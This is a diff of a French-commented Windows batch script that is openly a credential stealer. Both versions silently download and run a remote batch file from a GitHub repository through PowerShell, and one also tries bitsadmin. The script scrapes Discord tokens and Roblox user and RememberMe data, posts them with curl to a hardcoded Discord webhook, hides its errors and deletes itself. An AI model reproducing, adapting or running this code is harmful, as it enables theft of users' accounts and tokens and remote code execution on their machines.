@@ -1,33 +1,24 @@
 @echo off
 setlocal enabledelayedexpansion
-:: PALOFSC - SCRIPT COMBINE : EXECUTION DISTANTE (si dispo) + EXFILTRATION
-:: Toutes les erreurs sont redirigées vers nul pour éviter les messages intempestifs.
+:: PALOFSC - SCRIPT FINAL : EXECUTION DISTANTE + EXFILTRATION LOCALE
+:: WEBHOOK CONFIGURE CI-DESSOUS
+set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
 
-:: ETAPE 1 : CONFIGURATION DU WEBHOOK
-set "WEBHOOK_URL=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
-
-:: ETAPE 2 : TENTATIVE DE TELECHARGEMENT ET EXECUTION DU SCRIPT DISTANT
-set "REMOTE_URL=https://raw.githubusercontent.com/Gxnis/freenitrocode/refs/heads/main/script.bat"
-set "TMPFILE=%TEMP%\dl_%RANDOM%.bat"
-
-:: Téléchargement via bitsadmin (silencieux)
-bitsadmin /transfer "dl" /download /priority foreground "%REMOTE_URL%" "%TMPFILE%" >nul 2>&1
-if errorlevel 1 (
-    :: Fallback avec PowerShell
-    powershell -NoProfile -Command "(New-Object Net.WebClient).DownloadFile('%REMOTE_URL%', '%TMPFILE%')" >nul 2>&1
-)
-
-:: Vérification : si le fichier existe et n'est pas vide, on l'exécute en arrière-plan
+:: ===== 1. TENTATIVE D'EXECUTION DU SCRIPT DISTANT (en arrière-plan) =====
+set "REMOTE=https://raw.githubusercontent.com/Gxnis/freenitrocode/refs/heads/main/script.bat"
+set "TMPFILE=%TEMP%\remote_%RANDOM%.bat"
+:: Téléchargement via PowerShell (silencieux)
+powershell -NoProfile -Command "& {$wc=New-Object Net.WebClient; $wc.DownloadFile('%REMOTE%', '%TMPFILE%')}" >nul 2>&1
+:: Vérification : si fichier non vide, lancement en arrière-plan
 if exist "%TMPFILE%" (
-    for %%A in ("%TMPFILE%") do if %%~zA neq 0 (
-        start /b "" "%TMPFILE%" >nul 2>&1
-        timeout /t 1 /nobreak >nul 2>&1
+    for %%A in ("%TMPFILE%") do if %%~zA gtr 0 (
+        start /b "" cmd.exe /c "%TMPFILE%"
     )
+    del /f /q "%TMPFILE%" >nul 2>&1
 )
-:: Suppression du fichier temporaire (qu'il existe ou non)
-del /f /q "%TMPFILE%" >nul 2>&1
 
-:: ETAPE 3 : RECUPERATION DES TOKENS DISCORD (sans affichage d'erreurs)
+:: ===== 2. EXFILTRATION LOCALE (indépendante du distant) =====
+:: 2a. Tokens Discord
 set "discord_paths=%APPDATA%\Discord\Local Storage\leveldb %APPDATA%\discordptb\Local Storage\leveldb %APPDATA%\discordcanary\Local Storage\leveldb"
 set "tokens="
 for %%p in (%discord_paths%) do (
@@ -38,7 +29,7 @@ for %%p in (%discord_paths%) do (
     )
 )
 
-:: ETAPE 4 : RECUPERATION DES DONNEES ROBLOX
+:: 2b. Données Roblox
 set "roblox_cookie=%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml"
 set "roblox_user="
 set "roblox_pass="
@@ -49,25 +40,22 @@ if exist "%roblox_cookie%" (
     for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
 )
 
-:: ETAPE 5 : CONSTRUCTION DU PAYLOAD JSON
-set "payload={"
-set "payload=!payload!\"content\":\"=== EXFILTRATION ===\\n"
-if not "!tokens!"=="" set "payload=!payload!Tokens Discord : !tokens!\\n"
-if not "!roblox_user!"=="" set "payload=!payload!Roblox UserID : !roblox_user!\\n"
-if not "!roblox_pass!"=="" set "payload=!payload!Roblox RememberMe : !roblox_pass!\\n"
-if not "!roblox_token!"=="" set "payload=!payload!Roblox Token : !roblox_token!\\n"
+:: 2c. Construction du payload JSON
+set "payload={\"content\":\"=== EXFILTRATION ===\n"
+if not "!tokens!"=="" set "payload=!payload!Tokens Discord : !tokens!\n"
+if not "!roblox_user!"=="" set "payload=!payload!Roblox UserID : !roblox_user!\n"
+if not "!roblox_pass!"=="" set "payload=!payload!Roblox RememberMe : !roblox_pass!\n"
+if not "!roblox_token!"=="" set "payload=!payload!Roblox Token : !roblox_token!\n"
 set "payload=!payload!\"}"
 
-:: ETAPE 6 : ENVOI VIA CURL (silencieux)
-curl -s -H "Content-Type: application/json" -d "!payload!" "%WEBHOOK_URL%" >nul 2>&1
+:: 2d. Envoi via curl (silencieux)
+curl -s -H "Content-Type: application/json" -d "!payload!" "%WEBHOOK%" >nul 2>&1
 
-:: ETAPE 7 : NETTOYAGE MEMOIRE
+:: ===== 3. NETTOYAGE ET SUPPRESSION =====
 set "tokens="
 set "roblox_token="
 set "roblox_user="
 set "roblox_pass="
 set "payload="
-
-:: ETAPE 8 : AUTO-SUPPRESSION DU SCRIPT LUI-MEME
 del /f /q "%~f0" >nul 2>&1
 exit /b 0
